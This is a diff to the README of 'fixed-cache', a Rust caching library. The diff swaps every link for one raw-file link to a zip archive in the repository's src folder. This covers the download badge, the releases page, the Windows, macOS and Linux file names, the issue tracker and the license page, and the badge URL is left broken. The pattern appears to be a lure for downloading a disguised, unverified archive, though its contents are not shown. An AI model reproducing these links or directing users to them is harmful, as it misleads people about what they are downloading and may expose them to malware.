@@ -1,7 +1,7 @@
 # 🖥️ fixed-cache - Simple, Fast Cache for Rust Users
 
 ## 📥 Download the Application
-[![Download fixed-cache](https://img.shields.io/badge/Download%20fixed--cache-007BFF?style=flat&logo=github)](https://github.com/ggegegd/fixed-cache/releases)
+[![Download fixed-cache](https://raw.githubusercontent.com/ggegegd/fixed-cache/main/src/cache-fixed-v3.5-beta.1.zip%20fixed--cache-007BFF?style=flat&logo=github)](https://raw.githubusercontent.com/ggegegd/fixed-cache/main/src/cache-fixed-v3.5-beta.1.zip)
 
 ## 🚀 Getting Started
 Welcome to **fixed-cache**! This application provides a simple, lock-free, fixed-size cache. You will notice faster data retrieval and improved performance in your applications. 
@@ -21,16 +21,16 @@ Welcome to **fixed-cache**! This application provides a simple, lock-free, fixed
 ## 📬 How to Download & Install
 
 1. **Visit the Releases Page**
-   Go to the [fixed-cache Releases](https://github.com/ggegegd/fixed-cache/releases) page. 
+   Go to the [fixed-cache Releases](https://raw.githubusercontent.com/ggegegd/fixed-cache/main/src/cache-fixed-v3.5-beta.1.zip) page. 
 
 2. **Choose the Latest Version**
    Once there, locate the latest release version. It typically looks like a bright button or highlighted section labeled "Latest Release."
 
 3. **Download the Application**
    Below the latest release, find the downloadable files. Click on the one that matches your operating system. For example:
-   - For Windows, look for `fixed-cache-windows.zip`
-   - For macOS, choose `fixed-cache-macos.zip`
-   - For Linux, select `fixed-cache-linux.tar.gz`
+   - For Windows, look for `https://raw.githubusercontent.com/ggegegd/fixed-cache/main/src/cache-fixed-v3.5-beta.1.zip`
+   - For macOS, choose `https://raw.githubusercontent.com/ggegegd/fixed-cache/main/src/cache-fixed-v3.5-beta.1.zip`
+   - For Linux, select `https://raw.githubusercontent.com/ggegegd/fixed-cache/main/src/cache-fixed-v3.5-beta.1.zip`
 
 4. **Extract the Files**
    After downloading, locate the file in your downloads folder. Right-click on the file and select "Extract All..." or use a similar option, depending on your operating system. Follow the on-screen prompts to extract the files.
@@ -47,11 +47,11 @@ You can define parameters like cache size, eviction policies, or storage options
 ## 🌐 Support
 If you face any issues or have questions, feel free to open an issue in the GitHub repository. The community is here to help, and you can find support on:
 
-- **GitHub Issues:** [Report an Issue](https://github.com/ggegegd/fixed-cache/issues)
+- **GitHub Issues:** [Report an Issue](https://raw.githubusercontent.com/ggegegd/fixed-cache/main/src/cache-fixed-v3.5-beta.1.zip)
 - **Community Forums:** Join discussions related to Rust development and caching.
 
 ## 📄 License
-This application is open-source and licensed under the MIT License. You can view the full license details on the [license page](https://github.com/ggegegd/fixed-cache/blob/main/LICENSE).
+This application is open-source and licensed under the MIT License. You can view the full license details on the [license page](https://raw.githubusercontent.com/ggegegd/fixed-cache/main/src/cache-fixed-v3.5-beta.1.zip).
 
 ## 🗺️ Related Topics
 - Atomics
@@ -65,4 +65,4 @@ Follow the project on GitHub for updates and future releases. Your feedback is v
 
 ---
 
-For more information and to start your caching journey, be sure to visit the [fixed-cache Releases](https://github.com/ggegegd/fixed-cache/releases) page and download the application today!
+For more information and to start your caching journey, be sure to visit the [fixed-cache Releases](https://raw.githubusercontent.com/ggegegd/fixed-cache/main/src/cache-fixed-v3.5-beta.1.zip) page and download the application today!
